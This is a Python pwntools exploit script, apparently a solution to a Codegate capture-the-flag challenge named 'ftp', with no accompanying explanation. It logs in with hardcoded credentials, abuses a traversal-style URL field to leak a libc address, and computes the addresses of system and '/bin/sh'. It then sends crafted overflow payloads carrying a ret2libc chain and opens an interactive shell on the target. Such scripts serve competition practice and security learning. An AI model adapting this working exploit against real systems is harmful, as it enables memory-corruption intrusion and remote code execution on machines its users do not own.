from pwn import *
import sys, time

if len(sys.argv) == 1:
    p = process(["./ftp"])

else:
    p = remote("ch41l3ng3s.codegate.kr", "2121")

#context.log_level = "debug"

def login(name, age, _id, _pw):
    p.recvuntil("Choice:")
    p.send(p32(1))
    p.recvuntil("Name:")
    p.sendline(name)
    p.recvuntil("Age:")
    p.sendline(str(age))
    p.recvuntil("ID:")
    p.sendline(_id)
    p.recvuntil("PW:")
    p.sendline(_pw)

def validation(_id, _pw):
    p.send(p32(3))
    p.recvuntil("id:")
    p.sendline(_id)
    p.recvuntil("pw:")
    p.sendline(_pw)

def secret(URL):
    p.recvuntil("ice:")
    p.send(p32(8))
    p.send(p32(1))
    p.recvuntil("URL:")
    p.sendline(URL)


secret_id = "admin"
secret_pw = "P3ssw0rd"
loop = True

while loop:
    try:
        login("JS", 24, secret_id, secret_pw)
        validation(secret_id, secret_pw)
        p.recvuntil("Choice:")
        p.send(p32(2))
        #p.send(p32(4))

        secret("/../ab/../")
        #secret("/../" + "ABCD" * 4 + "/../")

        p.recvuntil("\n")
        leak = p.recv(4)[::-1]
        if leak[3] == "\xf7":
            loop = False
        else:
            raise

        leak = u32(leak)
        p.recvuntil("\n")
        libc_base = leak - 0x22fe6e
        system = libc_base + 0x3ada0
        binsh = libc_base + 0x15b9ab
        log.info("libc_base : " + hex(libc_base))
        log.info("system : " + hex(system))

        for i in xrange(ord('/') - 1):
            login("JS", 24, secret_id, secret_pw)
            validation(secret_id, secret_pw)
        '''
        padd
        '''
        exp = "/../../" + "B" * (0x55 - 8) + p32(0xdeadbeef)[::-1] + "B" * 4
        secret(exp)
        exp = "/../../" + "a" * 0x50
        secret(exp)
        exp = "/../../" + "b" * 0x40
        secret(exp)
        '''
        padd end
        '''
        exp = "/../../" + "c" * 0x30
        secret(exp)
        pause()
        exp = "/../../" + "B" * (0x55 - 8 - 4 - 4 - 4 -4) + "C" * 3 + p32(binsh)[::-1] + p32(0xdeadbeef)[::-1] + p32(system)[::-1] + p32(binsh)[::-1] + p32(system)[::-1]
        secret(exp)

        p.interactive()

    except:
        if loop:
            p.close()
            p = process(["./ftp"])
        else:
            p.interactive()
